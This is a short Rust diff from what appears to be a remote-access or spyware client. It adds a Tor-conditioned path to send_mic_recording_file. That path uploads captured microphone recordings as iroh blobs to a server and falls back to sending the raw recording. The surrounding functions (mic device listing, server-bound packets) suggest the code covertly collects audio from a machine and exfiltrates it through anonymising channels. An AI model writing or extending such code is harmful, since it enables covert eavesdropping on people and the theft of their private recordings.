@@ -95,6 +95,23 @@ pub fn send_mic_device_list() {
 }
 
 fn send_mic_recording_file(name: String, data: Vec<u8>) {
+    if crate::service::config::get_config().use_tor {
+        let name_clone = name.clone();
+        let data_clone = data.clone();
+        tokio::spawn(async move {
+            if let Some(blob_info) = crate::features::iroh::add_blob(data_clone, name_clone, common::packets::BlobContext::AudioRecording).await {
+                if let Err(_e) = crate::handler::send_packet(ServerboundPacket::IrohBlobReady(blob_info)).await {
+                    let payload = FileData { name, data };
+                    let _ = crate::handler::send_packet(ServerboundPacket::MicRecordingFile(payload)).await;
+                }
+            } else {
+                let payload = FileData { name, data };
+                let _ = crate::handler::send_packet(ServerboundPacket::MicRecordingFile(payload)).await;
+            }
+        });
+        return;
+    }
+
     let payload = FileData { name, data };
     if let Err(err) = send_packet_sync(ServerboundPacket::MicRecordingFile(payload)) {
         eprintln!("Failed to send mic recording file: {}", err);
